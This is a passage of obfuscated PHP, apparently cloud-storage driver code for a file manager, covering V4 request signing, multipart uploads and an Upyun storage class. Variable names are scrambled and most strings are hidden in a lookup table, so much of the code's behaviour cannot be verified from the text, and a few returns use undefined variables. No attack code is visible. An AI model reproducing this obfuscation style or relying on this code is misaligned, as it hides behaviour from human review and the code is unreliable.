$Ìƒ…©àß = hash_hmac($²Òê°Ìï[282], $ê¾€ôå¾, $²Òê°Ìï[283] . $this->secret, !0); $ÆÑ™–»¨ = hash_hmac($²Òê°Ìï[282], $this->region, $Ìƒ…©àß, !0); $×Ñ¿ò³É = hash_hmac($²Òê°Ìï[282], $ë§ÛËíØ, $ÆÑ™–»¨, !0); $²Ñ¬íÉ = hash_hmac($²Òê°Ìï[282], $¦èİãÚæ, $×Ñ¿ò³É, !0); $¼…Œå´ü = hash_hmac($²Òê°Ìï[282], $ÇöÆ ò–, $²Ñ¬íÉ); $˜Ü¢ ë¬ = array($²Òê°Ìï[240] => $²Òê°Ìï[22], $²Òê°Ìï[284] => $²Òê°Ìï[22], $²Òê°Ìï[272] => $îœ‹ÚÎô, $²Òê°Ìï[277] => $áæúóÄø, $²Òê°Ìï[285] => $ÇöÆ ò–, $²Òê°Ìï[286] => $µØ« Ğ¾, $²Òê°Ìï[287] => $øÀàŸ¤, $²Òê°Ìï[288] => $¥–Ä’©², $²Òê°Ìï[289] => $Šª¸±±®, $²Òê°Ìï[290] => $¼…Œå´ü, $²Òê°Ìï[206] => $this->getHost()); return $˜Ü¢ ë¬; } public function multiUploadFormData($î‹ ²ß, $Û£å„¬ş = 3600) { $­Œ«Àü =& $_SERVER[ú÷îèÆÜ]; $»¡³‰¬¶ = gmdate($­Œ«Àü[1468]); $š÷éïÀ = array(); $ßø¶™¹ = $this->client->getUploadId($this->bucket, $î‹ ²ß, $š÷éïÀ); if (!$ßø¶™¹) { return !1; } return array($­Œ«Àü[248] => $ßø¶™¹, $­Œ«Àü[206] => $this->getHost() . $­Œ«Àü[18] . $this->pathEncode($î‹ ²ß), $­Œ«Àü[249] => $»¡³‰¬¶, $­Œ«Àü[104] => $î‹ ²ß); } public function multiUploadAuthData($ì·Ï“•‚, $Å•ãı® = array()) { $¯áóš‚å =& $_SERVER[ú÷îèÆÜ]; $âü¤…‰ = isset($Å•ãı®[$¯áóš‚å[185]]) ? $Å•ãı®[$¯áóš‚å[185]] : $¯áóš‚å[22]; $ò Áˆ º = $Å•ãı®[$¯áóš‚å[104]]; unset($Å•ãı®[$¯áóš‚å[104]]); if (isset($Å•ãı®[$¯áóš‚å[250]])) { return $this->listUploadParts($ò Áˆ º, $Å•ãı®); } $á²ñÛÓ³ = array(); if (isset($Å•ãı®[$¯áóš‚å[1469]])) { $á²ñÛÓ³[$¯áóš‚å[1470]] = $Å•ãı®[$¯áóš‚å[1469]]; } $ı”È™Î… = explode($¯áóš‚å[208], $this->getHost()); $™ãÍÏºş = array($¯áóš‚å[1471] => $ı”È™Î…[1], $¯áóš‚å[1472] => $¯áóš‚å[22], $¯áóš‚å[240] => $¯áóš‚å[130], $¯áóš‚å[284] => $Å•ãı®[$¯áóš‚å[86]]); $™•¨¢Ú = $¯áóš‚å[253]; $÷¾„â»² = $¯áóš‚å[18] . $this->pathEncode($ò Áˆ º) . $âü¤…‰; $é©ØúË = $this->client->__getSignatureV4($á²ñÛÓ³, $™ãÍÏºş, $™•¨¢Ú, $÷¾„â»²); if (strpos($âü¤…‰, $¯áóš‚å[252]) === 0) { if (isset($á²ñÛÓ³[$¯áóš‚å[1470]])) { $ËÌ¹¼‡ = $á²ñÛÓ³[$¯áóš‚å[1470]]; } else { if (isset($é©ØúË[$¯áóš‚å[1470]])) { $ËÌ¹¼‡ = $é©ØúË[$¯áóš‚å[1470]]; } else { $ËÌ¹¼‡ = hash($¯áóš‚å[282], $¯áóš‚å[22]); } } return array($¯áóš‚å[258] => $é©ØúË[$¯áóš‚å[258]], $¯áóš‚å[1470] => $ËÌ¹¼‡, $¯áóš‚å[249] => $é©ØúË[$¯áóš‚å[1473]]); } return $é©ØúË[$¯áóš‚å[258]]; } public function listUploadParts($æ‡ÕéõÀ, $à©³©œ = array()) { $İ¥¼†—Ë =& $_SERVER[ú÷îèÆÜ]; $²Ñùú©ê = str_replace($İ¥¼†—Ë[259], $İ¥¼†—Ë[22], $à©³©œ[$İ¥¼†—Ë[185]]); $Â‚¶§æ… = $this->client->listParts($this->bucket, $æ‡ÕéõÀ, $²Ñùú©ê); if (!$Â‚¶§æ…) { return !1; } $èŞ©»ÔÍ = $İ¥¼†—Ë[1474]; foreach ($Â‚¶§æ… as $ó· Íµ) { $èŞ©»ÔÍ .= $İ¥¼†—Ë[1475] . "\x3c\120\x61\x72\164\116\x75\155\x62\145\x72\x3e{$ó· Íµ[$İ¥¼†—Ë[1430]]}\74\x2f\x50\141\x72\164\x4e\165\155\x62\x65\162\76\xa" . "\x3c\105\x54\x61\x67\76{$ó· Íµ[$İ¥¼†—Ë[1431]]}\74\57\x45\x54\141\x67\76\12" . $İ¥¼†—Ë[1476]; } $èŞ©»ÔÍ .= $İ¥¼†—Ë[1477]; $Šğ–±Ô« = array(); $ªèÄ‹²Ü = explode($İ¥¼†—Ë[208], $this->getHost()); $¨Ì™®åÅ = array($İ¥¼†—Ë[1471] => $ªèÄ‹²Ü[1], $İ¥¼†—Ë[240] => $İ¥¼†—Ë[130], $İ¥¼†—Ë[284] => strlen($èŞ©»ÔÍ)); $»ä³À— = $İ¥¼†—Ë[251]; $çØ«åà = $İ¥¼†—Ë[18] . $this->pathEncode($æ‡ÕéõÀ) . $à©³©œ[$İ¥¼†—Ë[185]]; $¿¿Ïîû× = $this->client->__getSignatureV4($Šğ–±Ô«, $¨Ì™®åÅ, $»ä³À—, $çØ«åà, $èŞ©»ÔÍ); return array($İ¥¼†—Ë[258] => $¿¿Ïîû×[$İ¥¼†—Ë[258]], $İ¥¼†—Ë[249] => $¿¿Ïîû×[$İ¥¼†—Ë[1473]], $İ¥¼†—Ë[260] => $Â‚¶§æ…, $İ¥¼†—Ë[1470] => $¿¿Ïîû×[$İ¥¼†—Ë[1470]]); } public function link($äÎ™†®Å, $„ìŸŠñÈ = array()) { return parent::link($äÎ™†®Å, $„ìŸŠñÈ); } public function fileOut($º÷£ËË’, $­ ºé‚ = false, $¤à¤© = false, $ÀÃá = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ú÷îèÆÜ][1478])) { return parent::fileOutServer($º÷£ËË’, $­ ºé‚, $¤à¤©, $ÀÃá); } parent::fileOut($º÷£ËË’, $­ ºé‚, $¤à¤©, $ÀÃá); } public function fileOutImage($Ÿ‰öêÅ, $„Ü¡œ˜™ = 250) { if (strstr($this->endpoint, $_SERVER[ú÷îèÆÜ][1478])) { return parent::fileOutImageServer($Ÿ‰öêÅ, $„Ü¡œ˜™); } parent::fileOutImage($Ÿ‰öêÅ, $„Ü¡œ˜™); } public function fileOutLink($É¿ÜŞÁ¾) { $ˆÁµ­•Å =& $_SERVER[ú÷îèÆÜ]; if (substr($É¿ÜŞÁ¾, 0, 7) == $ˆÁµ­•Å[1371]) { $É¿ÜŞÁ¾ = $ˆÁµ­•Å[1372] . substr($É¿ÜŞÁ¾, 7); } header($ˆÁµ­•Å[172] . $É¿ÜŞÁ¾); die; } public function getHost() { $Ê¯óèïå =& $_SERVER[ú÷îèÆÜ]; $‹ÛĞ˜½ = str_rtrim(parent::getHost(), $Ê¯óèïå[18] . $this->bucket); $‹ÛĞ˜½ = explode($Ê¯óèïå[208], $‹ÛĞ˜½); return $‹ÛĞ˜½[0] . $Ê¯óèïå[208] . $this->bucket . $Ê¯óèïå[20] . $‹ÛĞ˜½[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($­œŸµ‡³, $¨ÂÎ¹Š = 0) { parent::__construct(); $this->source = $­œŸµ‡³; $this->sourceSize = $¨ÂÎ¹Š; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Óæ¤ÔÖæ = false) { return $this->sourceSize; } public function getContent($‰Æ«ˆø³ = false) { return $this->fileSubstr($‰Æ«ˆø³, 0, $this->sourceSize); } public function fileSubstr($Ì‡¼‡ÎĞ = false, $èçæ¡· = 0, $à¼¬­Á¥ = 0) { if (!$à¼¬­Á¥) { $à¼¬­Á¥ = $this->sourceSize; } $ÖËòÃÈä = $this->sourceSize - $èçæ¡·; if ($à¼¬­Á¥ >= $ÖËòÃÈä) { $à¼¬­Á¥ = $ÖËòÃÈä; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $èçæ¡·, $à¼¬­Á¥); } if ($this->sourceType == self::TYPE_FILE) { if ($à¼¬­Á¥ <= 0) { return $_SERVER[ú÷îèÆÜ][22]; } $½Û¦å¬‹ = ftell($this->source); fseek_64($this->source, $½Û¦å¬‹ + $èçæ¡·); $÷÷…æ = @fread($this->source, $à¼¬­Á¥); fseek_64($this->source, $½Û¦å¬‹); return $÷÷…æ; } } public function hashMd5($Ñ×™èÒ÷ = false) { return md5($this->getContent()); } public static function hash($§ŞÛ°‡¿, $½Èèğü¸ = 0) { $¸Ê¬¾—® = new PathDriverStream($§ŞÛ°‡¿, $½Èèğü¸); return $¸Ê¬¾—®->hashSimple($§ŞÛ°‡¿); } public static function md5($›ôğúŠ, $ŒÒõŠø = 0) { $ÇêıÅàß = new PathDriverStream($›ôğúŠ, $ŒÒõŠø); return $ÇêıÅàß->hashMd5($›ôğúŠ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\72\x2f\57\166\60\56\x61\x70\x69\x2e\x75\x70\171\x75\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¾ßİš˜ï) { parent::__construct(); $this->_init($¾ßİš˜ï); } public function _init($¥³ğ—¾Í) { $ÌÔ¸ÀŒ† =& $_SERVER[ú÷îèÆÜ]; foreach ($¥³ğ—¾Í as $ğ¹·—¥‰ => $«±Ì¨ÇÊ) { if (isset($this->{$ğ¹·—¥‰})) { $this->{$ğ¹·—¥‰} = $«±Ì¨ÇÊ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÌÔ¸ÀŒ†[1479] . LNG($ÌÔ¸ÀŒ†[1410])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ºÜ•ªøÍ, $°©Ì·Ğ = "\107\x45\x54") { $şö¯½æ =& $_SERVER[ú÷îèÆÜ]; $¦ˆ¤ğæé = gmdate($şö¯½æ[1443]); $Îªˆ†ª = base64_encode(hash_hmac($şö¯½æ[1480], "{$°©Ì·Ğ}\46{$ºÜ•ªøÍ}\x26{$¦ˆ¤ğæé}", md5("{$this->userpass}"), !0)); $é´‹»ê‡ = array("\x41\165\x74\x68\x6f\x72\151\172\141\x74\151\x6f\x6e\x3a\x55\120\x59\x55\x4e\x20{$this->username}\72{$Îªˆ†ª}", "\x44\141\x74\x65\72{$¦ˆ¤ğæé}"); return $é´‹»ê‡; } public function ussRequest($ÑÎ˜¾Ö, $ƒÏæîêÛ = "\x47\105\124", $¬Éôê›Î = false, $ãÚª¼°ü = false, $‚ÜÆ• = false) { $¹û¢Ğë‰ =& $_SERVER[ú÷îèÆÜ]; $ÑÎ˜¾Ö = trim($ÑÎ˜¾Ö, $¹û¢Ğë‰[18]); $Ù«¢æëß = "\57{$this->bucket}\x2f{$ÑÎ˜¾Ö}"; $‰Òªª…ƒ = $this->ussHeaders($Ù«¢æëß, $ƒÏæîêÛ); if ($ãÚª¼°ü) { $‰Òªª…ƒ = array_merge($‰Òªª…ƒ, $ãÚª¼°ü); } $®ĞÈÙ”Î = url_request($this->endpoint . $Ù«¢æëß, $ƒÏæîêÛ, $¬Éôê›Î, $‰Òªª…ƒ, $‚ÜÆ•); if (!$®ĞÈÙ”Î) { return array($¹û¢Ğë‰[1253] => !1, $¹û¢Ğë‰[1243] => $¹û¢Ğë‰[1481]); } if (strtolower($ƒÏæîêÛ) == $¹û¢Ğë‰[221] || in_array($®ĞÈÙ”Î[$¹û¢Ğë‰[1253]], array($¹û¢Ğë‰[266], $¹û¢Ğë‰[1482]))) { $¬Éôê›Î = $®ĞÈÙ”Î[$¹û¢Ğë‰[1483]]; } else { $¬Éôê›Î = json_decode($®ĞÈÙ”Î[$¹û¢Ğë‰[1243]], !0); if (!$¬Éôê›Î) { $¬Éôê›Î = $®ĞÈÙ”Î[$¹û¢Ğë‰[1243]]; } else { if (!$®ĞÈÙ”Î[$¹û¢Ğë‰[790]] && isset($¬Éôê›Î[$¹û¢Ğë‰[1484]])) { $¬Éôê›Î = $¬Éôê›Î[$¹û¢Ğë‰[1484]]; } } } return array($¹û¢Ğë‰[1253] => $®ĞÈÙ”Î[$¹û¢Ğë‰[790]], $¹û¢Ğë‰[1243] => $¬Éôê›Î); } public function mkfile($Ö¯â¶, $Ø©Ù˜¯‡ = '', $ü¯ó·ÅÄ = REPEAT_RENAME) { if ($this->setContent($Ö¯â¶, $Ø©Ù˜¯‡)) { return $this->getPathOuter($Ö¯â¶); } return !1; } public function mkdir($¡ü§öñí, $˜¸Í‘ã» = REPEAT_SKIP) { $é ÌÓ½ =& $_SERVER[ú÷îèÆÜ]; $‡ÑÓÙ³ê = trim($¡ü§öñí, $é ÌÓ½[18]); if ($this->_isFolder($‡ÑÓÙ³ê)) { return $this->getPathOuter($‡ÑÓÙ³ê); } $ù‰¹›£ß = array($é ÌÓ½[1485]); $€à†É ğ = $this->ussRequest($‡ÑÓÙ³ê, $é ÌÓ½[251], !1, $ù‰¹›£ß); return $€à†É ğ[$é ÌÓ½[1253]] ? $this->getPathOuter($‡ÑÓÙ³ê) : !1; } public function copyFile($²Â“Œ€, $¨Æá‘µØ) { $ëÓ£ü¥¬ =& $_SERVER[ú÷îèÆÜ]; $´×»®¡ø = array($ëÓ£ü¥¬[1486] . "\57{$this->bucket}\x2f{$²Â“Œ€}", $ëÓ£ü¥¬[1487]); $òÉÏàÉü = $this->ussRequest($¨Æá‘µØ, $ëÓ£ü¥¬[253], !1, $´×»®¡ø); return $òÉÏàÉü[$ëÓ£ü¥¬[1253]] ? !0 : $this->getPathOuter($¨Æá‘µØ); } public function moveFile($©õòÁ•¼, $£½ëŒãè) { $ûéœÜ =& $_SERVER[ú÷îèÆÜ]; $“«Ëƒ”Õ = array($ûéœÜ[1488] . "\x2f{$this->bucket}\x2f{$©õòÁ•¼}", $ûéœÜ[1487]); $±±‡â‚¢ = $this->ussRequest($£½ëŒãè, $ûéœÜ[253], !1, $“«Ëƒ”Õ); return $±±‡â‚¢[$ûéœÜ[1253]] ? !0 : $this->getPathOuter($£½ëŒãè); } public function delFile($Ÿ‡ùÃğ) { $·¬¿¤”† =& $_SERVER[ú÷îèÆÜ]; $‡Ì°ğá = $this->ussRequest($Ÿ‡ùÃğ, $·¬¿¤”†[1489]); return $‡Ì°ğá[$·¬¿¤”†[1253]] ? !0 : !1; } public function delFolder($¡İÜù¥Ú) { $ÎÁº„û =& $_SERVER[ú÷îèÆÜ]; if (!$this->exist($¡İÜù¥Ú)) { return !0; } $this->listItemCache = !1; $á‹®ºîÇ = $–Â½¾± = array(); $this->fileList($¡İÜù¥Ú, $á‹®ºîÇ, $–Â½¾±, !0); $this->listItemCache = !0; foreach ($–Â½¾± as $óô¯’Ó£) { $ßğ¹Öıƒ = $this->ussRequest($óô¯’Ó£[$ÎÁº„û[42]], $ÎÁº„û[1489]); if (!$ßğ¹Öıƒ[$ÎÁº„û[1253]]) { return !1; } } foreach ($á‹®ºîÇ as $Äû€ÁÄø) { $ßğ¹Öıƒ = $this->ussRequest($Äû€ÁÄø, $ÎÁº„û[1489]); if (!$ßğ¹Öıƒ[$ÎÁº„û[1253]]) { return !1; } } $ßğ¹Öıƒ = $this->ussRequest($¡İÜù¥Ú, $ÎÁº„û[1489]); return $ßğ¹Öıƒ[$ÎÁº„û[1253]]; } public function rename($éñõ˜¼­, $¶£İâÄà) { if ($this->isFile($éñõ˜¼­)) { $¶£İâÄà = get_path_father($éñõ˜¼­) . $¶£İâÄà; return $this->moveFile($éñõ˜¼­, $¶£İâÄà); } return $this->renameObject($éñõ˜¼­, $¶£İâÄà); } public function fileInfo($³ğÌ¬·“, $²µİÌÈĞ = false, $Áçèßåº = array()) { $ÇşÒŞ”Œ =& $_SERVER[ú÷îèÆÜ]; $ŒÖàÖİš = array($ÇşÒŞ”Œ[42] => $this->pathThis($³ğÌ¬·“), $ÇşÒŞ”Œ[94] => $this->getPathOuter($ÇşÒŞ”Œ[18] . $³ğÌ¬·“), $ÇşÒŞ”Œ[43] => $ÇşÒŞ”Œ[224], $ÇşÒŞ”Œ[86] => isset($Áçèßåº[$ÇşÒŞ”Œ[86]]) ? $Áçèßåº[$ÇşÒŞ”Œ[86]] : 0, $ÇşÒŞ”Œ[185] => $this->ext($³ğÌ¬·“)); if ($²µİÌÈĞ) { return $ŒÖàÖİš; } $ŒÖàÖİš[$ÇşÒŞ”Œ[225]] = $ŒÖàÖİš[$ÇşÒŞ”Œ[95]] = 0; $ŒÖàÖİš[$ÇşÒŞ”Œ[226]] = $ŒÖàÖİš[$ÇşÒŞ”Œ[227]] = !0; if (empty($Áçèßåº)) { $Áçèßåº = $this->objectMeta($³ğÌ¬·“); if (!$Áçèßåº) { return $ŒÖàÖİš; } } $ŒÖàÖİš[$ÇşÒŞ”Œ[225]] = intval($Áçèßåº[$ÇşÒŞ”Œ[1490]]); $ŒÖàÖİš[$ÇşÒŞ”Œ[95]] = intval($Áçèßåº[$ÇşÒŞ”Œ[1491]]); $ŒÖàÖİš[$ÇşÒŞ”Œ[86]] = $Áçèßåº[$ÇşÒŞ”Œ[86]]; return $ŒÖàÖİš; } public function folderInfo($ğºÏèÄ, $İÜÜØş = false) { $ŒÉøÔ” =& $_SERVER[ú÷îèÆÜ]; $äèŒ¡ØÍ = array($ŒÉøÔ”[42] => $this->pathThis($ğºÏèÄ), $ŒÉøÔ”[94] => $this->getPathOuter($ŒÉøÔ”[18] . $ğºÏèÄ), $ŒÉøÔ”[43] => $ŒÉøÔ”[85]); if ($İÜÜØş) { return $äèŒ¡ØÍ; } $äèŒ¡ØÍ[$ŒÉøÔ”[225]] = $äèŒ¡ØÍ[$ŒÉøÔ”[95]] = 0; $äèŒ¡ØÍ[$ŒÉøÔ”[226]] = $äèŒ¡ØÍ[$ŒÉøÔ”[227]] = !0; if (empty($ûá—µŒì)) { $ûá—µŒì = $this->objectMeta($ğºÏèÄ); if (!$ûá—µŒì) { return $äèŒ¡ØÍ; } } $äèŒ¡ØÍ[$ŒÉøÔ”[225]] = intval($ûá—µŒì[$ŒÉøÔ”[1490]]); $äèŒ¡ØÍ[$ŒÉøÔ”[95]] = intval($ûá—µŒì[$ŒÉøÔ”[1491]]); return $äèŒ¡ØÍ; } private function listObjs($¼íş¶Î°, $ÁŠ®å¹² = 0, $öô¹ÉØ = 1000) { $Ìû›ä =& $_SERVER[ú÷îèÆÜ]; $¼î¯¥Ï÷ = array($Ìû›ä[1492], $Ìû›ä[1493] . $öô¹ÉØ); if ($ÁŠ®å¹²) { $¼î¯¥Ï÷[] = $Ìû›ä[1494] . $ÁŠ®å¹²; } $ûá Ç² = $this->ussRequest($¼íş¶Î°, $Ìû›ä[255], !1, $¼î¯¥Ï÷); return !$ûá Ç²[$Ìû›ä[1253]] ? !1 : $ûá Ç²[$Ìû›ä[1243]]; } private function fileList($‹‘øË”Š, &$ÙÂŠÇ©Ç, &$¢š¦†Ûµ, $ÒßÆù  = false) { $Ô“ã¨Ó =& $_SERVER[ú÷îèÆÜ]; $‚ÙééßÉ = $Ô“ã¨Ó[22]; $ÄĞÈˆ« = 1000; $†öœµß = rtrim($‹‘øË”Š, $Ô“ã¨Ó[18]) . $Ô“ã¨Ó[18]; while (!0) { check_abort(); $±èëåÚ± = $this->listObjs($‹‘øË”Š, $‚ÙééßÉ, $ÄĞÈˆ«); if (!$±èëåÚ±) { return !1; } $‚ÙééßÉ = isset($±èëåÚ±[$Ô“ã¨Ó[1495]]) ? $±èëåÚ±[$Ô“ã¨Ó[1495]] : $Ô“ã¨Ó[22]; $ëµ—òüÌ = isset($±èëåÚ±[$Ô“ã¨Ó[1496]]) ? $±èëåÚ±[$Ô“ã¨Ó[1496]] : array(); foreach ($ëµ—òüÌ as $çŞ«›») { $è´ò­ó = $çŞ«›»[$Ô“ã¨Ó[43]] == $Ô“ã¨Ó[85] ? !0 : !1; $¤’òŒ›Ë = ltrim($†öœµß . $çŞ«›»[$Ô“ã¨Ó[42]], $Ô“ã¨Ó[18]) . ($è´ò­ó ? $Ô“ã¨Ó[18] : $Ô“ã¨Ó[22]); $œ·¤õ‡ = array($Ô“ã¨Ó[42] => $¤’òŒ›Ë, $Ô“ã¨Ó[43] => $è´ò­ó ? $Ô“ã¨Ó[85] : $Ô“ã¨Ó[224], $Ô“ã¨Ó[86] => $çŞ«›»[$Ô“ã¨Ó[390]], $Ô“ã¨Ó[1491] => $çŞ«›»[$Ô“ã¨Ó[1497]]); $this->cacheMethodInfoSet($¤’òŒ›Ë, $è´ò­ó, $œ·¤õ‡); if ($è´ò­ó) { $ÙÂŠÇ©Ç[] = $¤’òŒ›Ë; if ($ÒßÆù ) { $this->fileList($¤’òŒ›Ë, $ÙÂŠÇ©Ç, $¢š¦†Ûµ, $ÒßÆù ); } continue; } $¢š¦†Ûµ[] = $œ·¤õ‡; } if (count($ëµ—òüÌ) < $ÄĞÈˆ«) { break; } } $this->cacheMethodInfoSet($‹‘øË”Š, !0); } public function listPath($æ•—¨šâ, $ïÜïù…® = false) { $ïå•ØñÌ =& $_SERVER[ú÷îèÆÜ]; $şÖ½…º÷ = $İñÁˆÊŒ = array(); $this->fileList($æ•—¨šâ, $şÖ½…º÷, $İñÁˆÊŒ); foreach ($şÖ½…º÷ as $ó€ÀŠÛ» => $÷Îóı¾Ó) { $şÖ½…º÷[$ó€ÀŠÛ»] = $this->folderInfo($÷Îóı¾Ó, $ïÜïù…®); } foreach ($İñÁˆÊŒ as $ó€ÀŠÛ» => $÷Îóı¾Ó) { $İñÁˆÊŒ[$ó€ÀŠÛ»] = $this->fileInfo($÷Îóı¾Ó[$ïå•ØñÌ[42]], $ïÜïù…®, $÷Îóı¾Ó); } return array($ïå•ØñÌ[92] => $şÖ½…º÷, $ïå•ØñÌ[93] => $İñÁˆÊŒ); } public function has($ˆ’èş¤‡, $ìƒÕÃå = false, $Î ğ‡Ø‡ = true) { $Ùƒ¹“Å =& $_SERVER[ú÷îèÆÜ]; $…Ù„¿„­ = $Ùƒ¹“Å[22]; $¨’‡Ü•› = 500; $ş·”Ö›Ó = 0; $Õë¨©¶¯ = 0; $Ïº¸õÀ = rtrim($ˆ’èş¤‡, $Ùƒ¹“Å[18]) . $Ùƒ¹“Å[18]; while (!0) { check_abort(); $ãø×»×» = $this->listObjs($ˆ’èş¤‡, $…Ù„¿„­, $¨’‡Ü•›); if (!$ãø×»×») { return !1; } $…Ù„¿„­ = isset($ãø×»×»[$Ùƒ¹“Å[1495]]) ? $ãø×»×»[$Ùƒ¹“Å[1495]] : $Ùƒ¹“Å[22]; $Æ«Û¡Ú² = isset($ãø×»×»[$Ùƒ¹“Å[1496]]) ? $ãø×»×»[$Ùƒ¹“Å[1496]] : array(); if (empty($Æ«Û¡Ú²)) { break; } $ÇÙ …¤ = array_filter($Æ«Û¡Ú², function ($¸˜³ãğ) { $²¢”¿Ãü =& $_SERVER[ú÷îèÆÜ]; return $¸˜³ãğ[$²¢”¿Ãü[43]] == $²¢”¿Ãü[85]; }); $‘½İ£îÍ = count($Æ«Û¡Ú²); $ÇÙ …¤ = count($ÇÙ …¤); $ä„Ş¨•– = $‘½İ£îÍ - $ÇÙ …¤; if ($ìƒÕÃå) { $Õë¨©¶¯ += $ÇÙ …¤; $ş·”Ö›Ó += $ä„Ş¨•–; if ($‘½İ£îÍ < $¨’‡Ü•›) { break; } continue; } if ($Î ğ‡Ø‡) { if ($ä„Ş¨•–) { return !0; } } else { if ($ÇÙ …¤) { return !0; } } if ($‘½İ£îÍ < $¨’‡Ü•›) { break; } } if ($ìƒÕÃå) { return array($Ùƒ¹“Å[233] => $ş·”Ö›Ó, $Ùƒ¹“Å[234] => $Õë¨©¶¯); } return !1; } public function listAll($Û‡÷Ü¾£) { $©ó¦…êï =& $_SERVER[ú÷îèÆÜ]; $·’Â€ŠÒ = $Ô¨²Àæ = array(); $this->fileList($Û‡÷Ü¾£, $·’Â€ŠÒ, $Ô¨²Àæ, !0); $Ê±×İíã = array_to_keyvalue($Ô¨²Àæ, $©ó¦…êï[42]); foreach ($·’Â€ŠÒ as $´ãçŞ¸) { if (is_string($´ãçŞ¸)) { $Ê±×İíã[$´ãçŞ¸] = array($©ó¦…êï[86] => 0); } } return $this->listAllFiles($Û‡÷Ü¾£, $Ê±×İíã); } public function canRead($‡åÄğÂù) { return $this->exist($‡åÄğÂù) ? !0 : !1; } public function canWrite($Ğ£”‡¦À) { return $this->exist($Ğ£”‡¦À) ? !0 : !1; } public function getContent($•¼ÆƒÖ) { return $this->fileSubstr($•¼ÆƒÖ, 0, -1); } public function setContent($‡ÇÒÓ®×, $¼Õ´±Ùè = '') { $ÃÖ›êÃĞ =& $_SERVER[ú÷îèÆÜ]; if (!$¼Õ´±Ùè) { $İÇ•ˆ†í = $this->ussRequest($‡ÇÒÓ®×, $ÃÖ›êÃĞ[251]); return $İÇ•ˆ†í[$ÃÖ›êÃĞ[1253]]; } $ş•ğò º = $this->tempFile($this->pathThis($‡ÇÒÓ®×)); file_put_contents($ş•ğò º, $¼Õ´±Ùè); if ($this->upload($‡ÇÒÓ®×, $ş•ğò º)) { $this->tempFileRemve($ş•ğò º); return !0; } return !1; } public function fileSubstr($ŞÓ¥¿˜, $ó¤ÂÎ¢Š, $ÇÉàÓ§Ğ) { $‹É™ùµ =& $_SERVER[ú÷îèÆÜ]; if (!($‹âª™Â = $this->link($ŞÓ¥¿˜))) { return !1; } $±€ê¿« = !1; if ($ÇÉàÓ§Ğ > 0) { $Œ·ÖäÀ­ = $ó¤ÂÎ¢Š + $ÇÉàÓ§Ğ - 1; $±€ê¿« = array($‹É™ùµ[1458] . $ó¤ÂÎ¢Š . $‹É™ùµ[439] . $Œ·ÖäÀ­); } $’µ¦ºØ¤ = url_request($‹âª™Â, $‹É™ùµ[255], !1, $±€ê¿«); return $’µ¦ºØ¤[$‹É™ùµ[790]] ? $’µ¦ºØ¤[$‹É™ùµ[1243]] : !1; } public function upload($ª÷š¹“», $¸²’ù¯Ö, $÷’è×›± = false, $“È©íÛõ = REPEAT_REPLACE) { $ò§Í‚£¼ =& $_SERVER[ú÷îèÆÜ]; $ÒŠâçÕç = IO::size($¸²’ù¯Ö); if ($ÒŠâçÕç <= 1024 * 1024 * 200) { $‹·†÷¼Ñ = array($ò§Í‚£¼[1498] . $¸²’ù¯Ö); $š¼ ¸”‡ = $this->ussRequest($ª÷š¹“», $ò§Í‚£¼[253], $‹·†÷¼Ñ); return $š¼ ¸”‡[$ò§Í‚£¼[1253]] ? $this->getPathOuter($ª÷š¹“») : !1; } $«–¶œ¼ß = 1024 * 1024 * 10; $ÎÂß«Á = array($ò§Í‚£¼[1499], $ò§Í‚£¼[1500] . $ÒŠâçÕç, $ò§Í‚£¼[1501], $ò§Í‚£¼[1502] . $«–¶œ¼ß); $š¼ ¸”‡ = $this->ussRequest($ª÷š¹“», $ò§Í‚£¼[253], !1, $ÎÂß«Á); if (!$š¼ ¸”‡[$ò§Í‚£¼[1253]]) { return !1; } $ÕÀˆÑœ = $š¼ ¸”‡[$ò§Í‚£¼[1243]]; $¡¯ô¯êÂ = 0; $˜èæœÙµ = $ÕÀˆÑœ[$ò§Í‚£¼[1503]]; $èí³ë¢Î = fopen($¸²’ù¯Ö, $ò§Í‚£¼[1407]); if (!$èí³ë¢Î) { return !1; } do { $µÛì­¡è = $ÕÀˆÑœ[$ò§Í‚£¼[1504]]; fseek_64($èí³ë¢Î, $¡¯ô¯êÂ); $·†ê·ÒÕ = fread($èí³ë¢Î, $µÛì­¡è); $‘à…õæÕ = 0; do { $‘à…õæÕ++; $ÕÀˆÑœ = $this->uploadPart($ª÷š¹“», $ÕÀˆÑœ, $·†ê·ÒÕ); } while (!$ÕÀˆÑœ && $‘à…õæÕ < 3); if (!$ÕÀˆÑœ) { return !1; } $˜èæœÙµ = $ÕÀˆÑœ[$ò§Í‚£¼[1503]]; $¡¯ô¯êÂ += $µÛì­¡è; } while ($˜èæœÙµ != -1); fclose($èí³ë¢Î); $ÎÂß«Á = array($ò§Í‚£¼[1505], $ò§Í‚£¼[1506] . $ÕÀˆÑœ[$ò§Í‚£¼[1507]], $ò§Í‚£¼[1501]); $š¼ ¸”‡ = $this->ussRequest($ª÷š¹“», $ò§Í‚£¼[253], !1, $ÎÂß«Á); return $š¼ ¸”‡[$ò§Í‚£¼[1253]] ? $this->getPathOuter($ÊÂËÛê¨) : !1; } private function uploadPart($‡é‰…¼ü, $·ß ®Àµ, &$÷øÖ¢¸­) { $ãÅÀŞ‡ =& $_SERVER[ú÷îèÆÜ]; $şÃĞÛÃ¤ = array($ãÅÀŞ‡[1508], $ãÅÀŞ‡[1506] . $·ß ®Àµ[$ãÅÀŞ‡[1507]], $ãÅÀŞ‡[1509] . $·ß ®Àµ[$ãÅÀŞ‡[1503]], $ãÅÀŞ‡[153] . $·ß ®Àµ[$ãÅÀŞ‡[1504]]); $ ÑÏ†Æ = $this->ussRequest($‡é‰…¼ü, $ãÅÀŞ‡[253], $÷øÖ¢¸­, $şÃĞÛÃ¤); return !$ ÑÏ†Æ[$ãÅÀŞ‡[1253]] ? $ ÑÏ†Æ[$ãÅÀŞ‡[1253]] : $ ÑÏ†Æ[$ãÅÀŞ‡[1243]]; } public 